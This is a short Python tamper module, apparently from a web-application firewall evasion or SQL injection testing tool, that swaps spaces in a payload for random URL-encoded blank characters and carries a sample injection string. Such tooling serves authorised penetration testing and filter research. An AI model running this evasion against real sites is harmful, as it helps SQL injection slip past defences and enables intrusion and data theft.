import random


__example_payload__ = "' AND 1=1 OR 24=25 '"
__type__ = "changing the payload spaces to random ASCII blank characters"


def tamper(payload, **kwargs):
    blanks = ("%09", "%0A", "%0C", "%0D", "%00")
    retval = ""
    for char in payload:
        modifier = random.choice(blanks)
        if char == " ":
            retval += modifier
        else:
            retval += char
    return retval
